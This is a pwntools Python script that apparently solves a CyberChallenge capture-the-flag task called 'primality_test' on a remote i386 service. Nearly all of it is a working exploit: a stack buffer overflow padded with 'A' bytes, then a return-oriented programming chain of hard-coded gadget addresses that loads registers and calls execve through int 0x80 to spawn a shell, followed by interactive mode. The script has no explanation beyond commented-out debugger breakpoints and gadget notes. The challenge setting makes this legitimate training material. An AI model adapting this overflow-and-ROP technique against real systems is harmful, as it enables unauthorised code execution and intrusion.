from pwn import *

context.arch = 'i386'

p = remote('rop.challs.cyberchallenge.it', 9130)
# p = process('./primality_test')

# gdb.attach(p, '''
# b *0x080484c6
# b *0x08048960
# b *0x0804880b
# b *0x08048783
# ''')
# 0x08048609 : pop ebx ; pop ecx ; ret
# 0x08048606 : pop eax ; int 0x80
# payload = b'2' + b'A' * 79 \
payload = b'2' + b'A' * 79 \
    + p32(0x08048609) + p32(0x08048991) + b'\x00' * 4\
    + p32(0x08048606) + b'\x0b' + b'\x00' * 3

p.sendline(payload)
p.interactive()
